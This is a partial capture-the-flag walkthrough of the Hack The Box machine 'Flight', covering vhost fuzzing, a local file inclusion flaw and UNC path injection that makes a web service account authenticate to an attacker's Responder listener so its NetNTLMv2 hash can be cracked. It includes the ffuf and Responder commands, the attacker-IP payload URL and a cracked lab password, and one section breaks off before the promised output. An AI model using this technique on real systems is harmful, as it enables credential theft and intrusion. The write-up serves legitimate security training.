# HTB Flight

> **Platform:** Hack The Box
> **OS:** Windows Server 2019 (Active Directory + Apache + PHP)
> **Domain:** `flight.htb` — host `G0`
> **Difficulty:** Hard

> **Note:** this box is **out of scope for OSCP** — the full attack chain involves web exploitation and post-exploitation steps beyond the OSCP syllabus. Only the initial enumeration and credential capture are documented here.

## Attack Path Overview (Partial)

1. **Recon** – DC running **Apache 2.4.52** (unusual for Windows AD) on port 80, plus standard AD services. WinRM on 5985.
2. **Vhost discovery** – `ffuf` finds `school.flight.htb`.
3. **LFI** – `school.flight.htb/index.php?view=` is vulnerable to local file inclusion / UNC path injection.
4. **Responder** – coerce the web service account to authenticate via a UNC path, capture `svc_apache`'s NetNTLMv2, crack → `S@Ss!K@*t13`.
5. **RID brute (as `svc_apache`)** – enumerate all domain users.
6. *(Remainder of the box is out of scope and was not attempted.)*

## 3. LFI → Responder → `svc_apache`

The `school.flight.htb` site has a file-inclusion vulnerability on the `view` parameter:

```bash
ffuf -u 'http://school.flight.htb/index.php?view=FUZZ' \
  -w 'LFI payloads.txt' -t 50 -fw 144,149,73
```

Instead of reading local files, inject a UNC path to coerce the web service account into authenticating to your Responder listener:

```bash
sudo responder -I tun0
```

Trigger the LFI with a UNC path pointing to your Kali box:

```
http://school.flight.htb/index.php?view=//10.10.14.63/htb
```

Responder captures `svc_apache`'s NetNTLMv2 hash:

## Lessons Learned

- **Apache on a Windows DC** is unusual and signals a web-based attack surface.
- **Virtual host enumeration** (`ffuf` with `Host:` header fuzzing) can reveal hidden subdomains.
- **LFI + UNC paths** — when a PHP `include` or `file_get_contents` accepts a UNC path (`//attacker/share`), it coerces the web service account to authenticate via SMB, letting you capture a NetNTLMv2 hash with Responder.
- **Out of scope for OSCP** — the full attack chain involves additional web exploitation and Windows privilege escalation beyond AD fundamentals.
